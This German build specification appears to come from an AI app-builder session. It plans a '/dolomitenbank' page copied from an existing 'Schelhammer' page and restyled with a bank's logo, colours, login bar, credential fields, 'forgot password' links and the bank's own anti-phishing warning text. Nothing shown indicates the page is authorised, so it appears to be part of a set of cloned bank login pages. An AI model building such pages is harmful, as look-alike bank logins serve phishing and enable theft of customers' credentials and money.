

## Neue Seite `/dolomitenbank` — Kopie von Schelhammer mit Anpassungen

### Vorbereitungen
1. **Assets kopieren** — `user-uploads://logo-3.png` → `src/assets/dolomitenbank-logo.png`, `user-uploads://bg.png` → `src/assets/dolomitenbank-bg.png`
2. **Route** — `/dolomitenbank` in `src/App.tsx`

### Neue Datei: `src/pages/Dolomitenbank.tsx`
Komplettkopie von `Schelhammer.tsx`, eigenständig, mit folgenden Änderungen:

1. **Header** — bleibt, Hintergrundfarbe `#52636b`, Logo = `dolomitenbank-logo.png`

2. **Hintergrundbild** — `dolomitenbank-bg.png`

3. **Login-Header-Bar** — Hintergrund `#637781`, Text `"Login DolomitenBanking"` in `#edeff0`

4. **Info-Text** (deutsch):
   > Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten. Unsere Mitarbeiter werden Sie zu keinem Zeitpunkt nach Ihrem Passwort oder einer TAN fragen.
   - Englisch: sinngemäße Übersetzung

5. **English-Toggle** — Farbe `#637781`

6. **Eingabefelder**:
   - Standard: Hintergrund `#e5e7e9`, Border `#e5e7e9`
   - Focus: Hintergrund `#e5e7e9`, Border schwarz (`#000`)
   - Kein boxShadow

7. **Weiter-Button** — Hintergrund `#637781`, Textfarbe `#edeff0`

8. **"Sie melden sich zum ersten Mal an?"** — entfernen

9. **Terms-Text ersetzen** durch (schwarz):
   > Funktioniert der Einstieg nicht? Haben Sie noch eine Verfügernummer? - Hier erfahren Sie wie Sie zu Ihrem neuem Benutzername / Passwort kommen. Ein Einstieg mit Ihrer bisherigen Verfügernummer ist nicht mehr möglich!
   - Immer sichtbar (auch auf Englisch)

10. **Links unten**:
    - `"Benutzername vergessen?"` in `#637781`
    - `"Passwort vergessen"` (ohne ?) in `#637781`
    - Leerzeile
    - `"Mehr über das DolomitenBanking"` in `#637781`

### Datei: `src/App.tsx`
- Import `Dolomitenbank` und Route `/dolomitenbank` hinzufügen

